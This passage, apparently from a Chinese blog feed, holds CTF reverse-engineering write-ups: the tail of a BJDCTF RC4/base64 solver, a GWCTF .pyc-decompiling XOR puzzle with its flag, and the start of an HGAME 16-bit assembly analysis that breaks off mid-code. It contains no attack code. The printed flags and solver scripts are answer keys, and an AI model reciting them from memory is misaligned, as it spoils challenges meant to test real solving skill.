number">0x56</span><span class="token punctuation">,</span><span class="token number">0x0f</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0xf4</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0x82</span><span class="token punctuation">,</span><span class="token number">0xf9</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0xab</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0xfe</span><span class="token punctuation">,</span><span class="token number">0xd7</span><span class="token punctuation">,</span><span class="token number">0xac</span><span class="token punctuation">,</span><span class="token number">0xfd</span><span class="token punctuation">,</span><span class="token number">0x5e</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token comment">//密文</span>    ULONG len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>pData<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">rc4_init</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>key<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//已经完成了初始化</span>    <span class="token function">rc4_crypt</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>pData<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>pData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//加密</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>pData<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>pData<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"rc4 decrypt  : %s\n"</span><span class="token punctuation">,</span>pData<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">base64_decode</span><span class="token punctuation">(</span>pData<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decodekey <span class="token operator">=</span> <span class="token string">'Flag&#123;This_a_Flag&#125;'</span>decode_byte <span class="token operator">=</span> <span class="token string">'23152553081a5938126a3931275b0b1313085c330b356101511f105c'</span>encode_base64 <span class="token operator">=</span> <span class="token string">''</span>lists <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>decode_byte<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    lists<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>decode_byte<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>lists<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>lists<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    encode_base64 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>t <span class="token operator">=</span> <span class="token string">'0123456789+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ='</span>table <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='</span>table <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>t<span class="token punctuation">,</span> table<span class="token punctuation">)</span>flag <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>encode_base64<span class="token punctuation">.</span>translate<span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>BJD{0v0_Y0u_g07_1T!}</p></blockquote><h2 id="C-1"><a href="#C-1" class="headerlink" title="C++"></a>C++</h2><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-encode8.png" alt="BJDCTF-encode8.png"></p><h2 id="Python-1"><a href="#Python-1" class="headerlink" title="Python"></a>Python</h2><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-encode9.png" alt="BJDCTF-encode9.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【GWCTF】pyre</title>
      <link href="/posts/2de69a90.html"/>
      <url>/posts/2de69a90.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>关于对 python 的 .pyc 反编译时，uncompyle6 的 python 版本问题</p></li><li><p><mark>python 中的转义字符 “\x” 的含义<br>例如：’ \x1f ‘ 代表的是一个 char 字符型，这个字符的 ASCii 码为 0x1F</mark></p></li></ul><hr><p><a href="https://www.ctfer.vip/problem/251">【GWCTF】pyre</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>解压得到 .pyc 文件，用本机 uncompyle6 反编译</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GWCTF-pyre1.png" alt="GWCTF-pyre1.png"></p><p>提示 python 3.10.4 版本不对</p><p>用虚拟机 python 3.8.2 反编译成功</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GWCTF-pyre2.png" alt="GWCTF-pyre2.png"></p><p><mark>python 3.10.4 反编译经常出问题，可能是兼容性不好，还是建议用虚拟机的 python 3.8</mark></p><p>此外，也可以使用在线反编译网站进行反编译</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GWCTF-pyre3.png" alt="GWCTF-pyre3.png"></p><p>得到代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Welcome to Re World!'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Your input1 is your flag~'</span><span class="token punctuation">)</span>l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input1<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>input1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span> <span class="token operator">+</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span>    code <span class="token operator">+=</span> num<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> code<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\x1f'</span><span class="token punctuation">,</span> <span class="token string">'\x12'</span><span class="token punctuation">,</span> <span class="token string">'\x1d'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'\x01'</span><span class="token punctuation">,</span> <span class="token string">'\x06'</span><span class="token punctuation">,</span> <span class="token string">'\x14'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">'\x1b'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">'\x01'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">'\x13'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意这里 code 的写法：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\x1f'</span><span class="token punctuation">,</span> <span class="token string">'\x12'</span><span class="token punctuation">,</span> <span class="token string">'\x1d'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'\x01'</span><span class="token punctuation">,</span> <span class="token string">'\x06'</span><span class="token punctuation">,</span> <span class="token string">'\x14'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">'\x1b'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">'\x01'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">'\x13'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><mark>code 是一个列表，而 “\x” 是python 中的转义字符，\x1f 代表值为十六进制 0x1F 所对应的字符</mark></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GWCTF-pyre4.png" alt="GWCTF-pyre4.png"></p><p>将 code 列表中的字符元素统一转为十六进制：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x1f</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x1d</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span>          <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>逆向代码即可，题目已知最后的 code 列表状态，先通过：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> code<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>对 code 进行初始化</p><p><mark>注意这里，刚开始是通过正向异或得到 code，返回去需要逆向异或，即逆向 for 循环：</mark></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> code<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>得到：<code>[71, 88, 74, 87, 127, 79, 123, 122, 124, 104, 92, 112, 107, 62, 1, 110, 88, 114, 72, 73, 13, 54, 19]</code></p><p>然后根据 code 的长度为 23，推测 input1 的长度也为 23<br>通过正向暴力破解，寻找满足条件：<code>code[i] == ((j + i) % 128 + 128) % 128</code> 的字符，将其输出即可得到 flag</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Welcome to Re World!'</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Your input1 is your flag~'</span><span class="token punctuation">)</span>    code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x1f</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x1d</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span>          <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> code<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">if</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>j <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span> <span class="token operator">+</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">:</span>              <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>              <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>GWHT{Just_Re_1s_Ha66y!}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GWCTF-pyre5.png" alt="GWCTF-pyre5.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【HGAME】easyasm</title>
      <link href="/posts/1968db0b.html"/>
      <url>/posts/1968db0b.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li>汇编代码逻辑</li></ul><hr><p><a href="https://www.ctfer.vip/problem/1860">【HGAME】easyasm</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>将文件拖入 Exeinfo PE 查看文件类型：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/HGAME-easyasm1.png" alt="HGAME-easyasm1.png"></p><p>发现文件是一个 16位 的 MS-DOS 程序</p><p>拖入 IDA，对 start 函数 F5 反编译发现无法编译</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/HGAME-easyasm2.png" alt="HGAME-easyasm2.png"></p><p>可能是 IDA 无法反编译 16位 程序</p><p>直接查看汇编代码：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/HGAME-easyasm3.png" alt="HGAME-easyasm3.png"></p><p>首先将 <code>dseg</code> 移入 <code>ds</code> 段，将 <code>seg001</code> 移入 <code>es</code> 段</p><p><code>dseg</code> 的内容：<strong>hgame{Fill_in_your_flag}</strong></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/HGAME-easyasm4.png" alt="HGAME-easyasm4.png"></p><p><code>seg001</code> 的内容：<strong>[0x91, 0x61, 0x01, 0xC1, 0x41, 0xA0, 0x60, 0x41, 0xD1, 0x21, 0x14, 0xC1, 0x41, 0xE2, 0x50, 0xE1, 0xE2, 0x54, 0x20, 0xC1, 0xE2, 0x60, 0x14, 0x30, 0xD1, 0x51, 0xC0, 0x17, 0x00, 0x00, 0x00, 0x00]</strong></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/HGAME-easyasm5.png" alt="HGAME-easyasm5.png"></p><p>初始时 <code>si = 0</code>，根据：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">loc_100DD<span class="token operator">:</span>                              <span class="token punctuation">;</span> CODE XREF<span class="token operator">:</span> start<span class="token operator">+</span><span class="token number">38</span>↓jcmp     si<span class="token punctuation">,</span> <span class="token number">1</span>Chjz      <span class="token keyword">short</span> loc_10135<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>add     si<span class="token punctuation">,</span> <span class="token number">1</span>cmp     al<span class="token punctuation">,</span> es<span class="token operator">:</span><span class="token punctuation">[</span>si<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>jz      <span class="token keyword">short</span> loc_100DDmov     ax<span class="token punctuation">,</span> <span class="token number">0</span>B800hmov     es<span class="token punctuation">,</span> axassume es<span class="token operator">:</span>nothingmov     byte ptr es<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">77</span>h <span class="token punctuation">;</span> <span class="token char">'w'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">72</span>h <span class="token punctuation">;</span> <span class="token char">'r'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6F</span>h <span class="token punctuation">;</span> <span class="token char">'o'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">6</span>Eh <span class="token punctuation">;</span> <span class="token char">'n'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">67</span>h <span class="token punctuation">;</span> <span class="token char">'g'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">0</span>Ah<span class="token punctuation">,</span> <span class="token number">21</span>h <span class="token punctuation">;</span> <span class="token char">'!'</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>loc_10135<span class="token operator">:</span>                              <span class="token punctuation">;</span> CODE XREF<span class="token operator">:</span> start<span class="token operator">+</span><span class="token number">10</span>↑jmov     ax<span class="token punctuation">,</span> <span class="token number">0</span>B800hmov     es<span class="token punctuation">,</span> axmov     byte ptr es<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">72</span>h <span class="token punctuation">;</span> <span class="token char">'r'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">69</span>h <span class="token punctuation">;</span> <span class="token char">'i'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">67</span>h <span class="token punctuation">;</span> <span class="token char">'g'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">68</span>h <span class="token punctuation">;</span> <span class="token char">'h'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">74</span>h <span class="token punctuation">;</span> <span class="token char">'t'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">0</span>Ah<span class="token punctuation">,</span> <span class="token number">21</span>h <span class="token punctuation">;</span> <span class="token char">'!'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可知 <code>loc_100DD</code> 是一个循环，循环的次数由计数器 <code>si</code> 的值控制，每循环一次 si + 1<br>当 <code>si = 1Ch</code> 时，输出 “right!”<br>并且每一轮循环都必须满足 <code>al = es:[si-1]</code>，否则就输出 “wrong!”</p><p>根据：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">xor     ax<span class="token punctuation">,</span> axmov     al<span class="token punctuation">,</span> <span class="token punctuation">[</span>si<span class="token punctuation">]</span>shl     al<span class="token punctuation">,</span> <span class="token number">1</span>shl     al<span class="token punctuation">,</span> <span class="token number">1</span>shl     al<span class="token punctuation">,</span> <span class="token number">1</span>shl     al<span class="token punctuation">,</span> <span class="token number">1</span>push    ax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先通过异或 <code>xor     ax, ax</code> 将 <code>ax</code> 清零，然后将 <code>si</code> 中存放的值作为地址，取该地址上的值作为 <code>[si]</code> <em>（间接寻址，<code>si</code> 中存放的是操作数的地址）</em><br>将 <code>[si]</code> 的值存入 <code>ax</code>，然后 4 个 <code>shl     al, 1</code> 将 <code>al</code> 逻辑左移（低位补 0） 4 位后，将 <code>ax</code> 送入堆栈段</p><p>同理，根据：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">xor     ax<span 